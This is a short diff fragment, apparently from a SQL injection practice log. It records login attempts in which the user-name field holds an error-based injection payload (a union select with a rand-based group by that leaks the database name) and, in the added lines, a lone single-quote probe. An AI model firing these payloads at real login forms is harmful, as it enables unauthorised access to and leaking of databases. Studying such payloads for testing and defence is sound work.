@@ -16,3 +16,5 @@ User Name:1\
 Password:
 User Name:1') union select 1,count(*) from information_schema.tables group by concat_ws("::", database(), floor(rand(0)*2)) #
 Password:
+User Name:'
+Password:
